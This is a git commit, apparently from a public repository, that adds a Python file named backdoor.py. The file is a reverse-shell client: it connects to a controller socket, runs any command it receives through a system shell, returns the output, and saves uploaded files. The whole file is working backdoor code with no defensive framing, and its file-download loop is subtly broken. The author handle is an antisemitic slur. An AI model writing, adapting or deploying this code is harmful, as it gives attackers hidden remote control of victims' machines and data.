285bd21daeb55fea6bc22a5b2906643e3e6b7acf
CEOofJEWS <hasslersven59@gmail.com>
2026-07-12 02:02:55 +0200

    Add files via upload

---
+++ backdoor.py
@@ -0,0 +1,57 @@
+import os
+import socket
+import json
+import subprocess
+from subprocess import Popen
+from typing import Any
+
+
+def reliable_send(data):
+    jsondata = json.dumps(data)
+    s.send(jsondata.encode())
+
+def reliable_recv():
+    data = ''
+    while True:
+        try:
+            data = data + s.recv(1024).decode().rstrip()
+            return json.loads(data)
+        except ValueError:
+            continue
+
+def download_file(file_name):
+    f = open(file_name, 'wb')
+    s.settimeout(1)
+    chunk = s.recv(1024)
+    while chunk:
+        f.write(chunk)
+        try:
+            chunk = s.recv(1024)
+        except socket.timeout as e:
+            break
+        s.settimeout(None)
+        f.close()
+
+def shell():
+    while True:
+        command = reliable_recv()
+        if command == 'quit':
+            break
+        elif command == 'help':
+            pass
+        elif command == 'clear' :
+            pass
+        elif command[:3] == 'cd ':
+            os.chdir(command[3:])
+            print(os.getcwd())
+        elif command[:6] == 'upload' :
+            download_file(command[7:])
+        else:
+            execute: Popen[str] | Popen[bytes] | Popen[Any] = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+            result = execute.stdout.read() + execute.stderr.read()
+            result = result.decode()
+            reliable_send(result)
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(('127.0.0.1' , 5555))
+shell()
